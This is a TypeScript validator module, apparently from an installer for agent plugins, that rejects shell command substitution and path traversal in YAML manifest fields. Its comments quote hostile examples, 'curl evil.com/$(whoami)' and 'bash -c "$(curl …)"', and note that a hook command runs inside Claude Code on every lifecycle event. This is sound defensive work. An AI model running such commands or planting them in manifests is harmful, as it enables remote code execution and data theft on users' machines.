// Phase 1.1.1 hotfix per Paranoid Staff Engineer review B1.
//
// ADR 0001 § "字段拒绝清单" claims schema rejects ${shell command} dynamic
// substitution patterns, but v0.1 phase 1.1 schema only does structural
// validation (Type.String + minLength). This module fills the gap before
// phase 1.2 installer ships — without it, an upstream manifest with
// `cmd: 'curl evil.com/$(whoami)'` would pass validation, and the
// phase 1.2 installer that spawns the cmd string would execute arbitrary
// code on the user's machine.
//
// v0.2 plan: add a `requires_secret` schema field + explicit
// `${secret:KEY}` template syntax, at which point this detector should
// allow the `${secret:*}` whitelist while still rejecting raw `${VAR}`.
//
// Detected patterns (4):
//   - `$(...)`     POSIX command substitution
//   - `${...}`     variable expansion
//   - backtick     old-style command substitution
//   - dangerous    yaml tags (handled at parse layer by yaml@2.x; we
//                  don't double-check, but document the trust boundary)
//
// Targeted fields:
//   - spec.install.cmd
//   - spec.verify.cmd
//   - spec.uninstall.cmd
//   - spec.uninstall.cleanup_paths[*]
//   - spec.harness_overrides.codex.uninstall.{cmd,cleanup_paths[*]}

import type { Document, LineCounter, Node } from 'yaml'
import { isAlias, isMap, isScalar, isSeq } from 'yaml'
import type { ValidationError } from './errors.js'
import { checkPathSafe, PathTraversalError } from './lib/path-guard.js'

interface ShellPattern {
  test: (s: string) => boolean
  label: string
  hint: string
}

const PATTERNS: ShellPattern[] = [
  {
    label: '$(...)',
    hint: 'POSIX command substitution',
    test: (s) => /\$\(/.test(s),
  },
  {
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal pattern label, not a JS template
    label: '${...}',
    // biome-ignore lint/suspicious/noTemplateCurlyInString: literal example in user-facing message
    hint: 'variable expansion (v0.2 will whitelist `${secret:KEY}`)',
    test: (s) => /\$\{/.test(s),
  },
  {
    label: 'backtick',
    hint: 'old-style command substitution',
    test: (s) => /`/.test(s),
  },
]

function lineOf(node: Node | null | undefined, lineCounter: LineCounter): number | null {
  if (!node?.range) return null
  const offset = node.range[0]
  return lineCounter.linePos(offset).line
}

/** Follow only known security paths; retain the first alias usage for diagnostics. */
function securityNodeAtPath(doc: Document.Parsed, path: Array<string | number>) {
  let node: unknown = doc.contents
  let alias: Node | undefined
  for (const key of path) {
    if (isAlias(node)) {
      alias ??= node
      node = node.resolve(doc)
    }
    if (!isMap(node) && !isSeq(node)) return { node: undefined, alias }
    node = node.get(key, true)
  }
  if (isAlias(node)) {
    alias ??= node
    node = node.resolve(doc)
  }
  return { node, alias }
}

/**
 * String-level shell-escape detector for runtime defense-in-depth.
 *
 * Phase 1.2 lib/spawn.ts re-runs this on `manifest.spec.install.cmd` right
 * before child_process.spawn(): if a future caller (e.g. phase 1.4 routing,
 * a test harness, or an installer that bypasses validate.ts) hands an
 * unvalidated cmd string to spawn, we still refuse to execute. Same pattern
 * set as `checkSecurityViolations`, just operating on a raw string instead
 * of a yaml AST node — no source-line/path context here.
 *
 * Returns the offending pattern descriptor on first hit, or null if clean.
 */
export function checkCmdString(cmd: string): { label: string; hint: string } | null {
  for (const pat of PATTERNS) {
    if (pat.test(cmd)) return { label: pat.label, hint: pat.hint }
  }
  return null
}

function checkScalarCmd(
  doc: Document.Parsed,
  lineCounter: LineCounter,
  path: Array<string | number>,
  filename: string,
): ValidationError | null {
  const { node, alias } = securityNodeAtPath(doc, path)
  if (!node || !isScalar(node)) return null
  const value = node.value
  if (typeof value !== 'string') return null
  for (const pat of PATTERNS) {
    if (pat.test(value)) {
      return {
        file: filename,
        path: `/${path.join('/')}`,
        message: `shell escape detected: '${pat.label}' (${pat.hint}) at ${path.join('.')} — v0.1 forbids dynamic shell evaluation; v0.2 will use \`requires_secret\` + \`\${secret:KEY}\` for env placeholders`,
        line: lineOf(alias ?? node, lineCounter),
        column: null,
        keyword: 'security',
      }
    }
  }
  return null
}

/**
 * Pre-Ajv security gate per ADR 0001 § "字段拒绝清单".
 * Walks the parsed yaml AST and rejects any string-typed cmd field (or
 * cleanup_paths sequence element) containing `$(...)`, `${...}`, or
 * backticks. Returns ALL violations found (not short-circuit) so the
 * user can fix them in one pass.
 */
export function checkSecurityViolations(
  doc: Document.Parsed,
  filename: string,
  lineCounter: LineCounter,
): ValidationError[] {
  const errors: ValidationError[] = []

  // Walk known cmd paths. We do NOT do generic AST recursion because we
  // want surgical: only fields where the installer will spawn a shell.
  const cmdPaths: Array<Array<string | number>> = [
    ['spec', 'install', 'cmd'],
    ['spec', 'verify', 'cmd'],
    ['spec', 'uninstall', 'cmd'],
    // `hook_command` is written verbatim into ~/.claude/settings.json and then
    // executed by Claude Code on EVERY matching lifecycle event — the most-run
    // command string a manifest can carry, and it was the one never screened:
    // `bash -c "$(curl …)"` validated clean.
    ['spec', 'install', 'hook_command'],
    // Harness override commands need the same screen as their base counterparts.
    ['spec', 'harness_overrides', 'codex', 'install', 'cmd'],
    ['spec', 'harness_overrides', 'codex', 'verify', 'cmd'],
    ['spec', 'harness_overrides', 'codex', 'uninstall', 'cmd'],
  ]

  for (const p of cmdPaths) {
    const err = checkScalarCmd(doc, lineCounter, p, filename)
    if (err) errors.push(err)
  }

  // cleanup_paths is a sequence of strings — iterate each element.
  const cleanupPaths = [
    ['spec', 'uninstall', 'cleanup_paths'],
    ['spec', 'harness_overrides', 'codex', 'uninstall', 'cleanup_paths'],
  ]
  for (const path of cleanupPaths) {
    const { node: cleanupNode, alias } = securityNodeAtPath(doc, path)
    if (!cleanupNode || !isSeq(cleanupNode)) continue
    cleanupNode.items.forEach((item, idx) => {
      const node = isAlias(item) ? item.resolve(doc) : item
      if (!isScalar(node)) return
      const value = node.value
      if (typeof value !== 'string') return
      const source = alias ?? (isAlias(item) ? item : node)
      for (const pat of PATTERNS) {
        if (pat.test(value)) {
          errors.push({
            file: filename,
            path: `/${path.join('/')}/${idx}`,
            message: `shell escape detected: '${pat.label}' (${pat.hint}) at ${path.join('.')}[${idx}] — v0.1 forbids dynamic shell evaluation`,
            line: lineOf(source, lineCounter),
            column: null,
            keyword: 'security',
          })
          return
        }
      }
      // Lexical traversal checks do not replace runtime root/symlink confinement.
      try {
        checkPathSafe(value)
      } catch (error) {
        if (!(error instanceof PathTraversalError)) throw error
        errors.push({
          file: filename,
          path: `/${path.join('/')}/${idx}`,
          message: error.message,
          line: lineOf(source, lineCounter),
          column: null,
          keyword: 'security',
        })
      }
    })
  }

  return errors
}
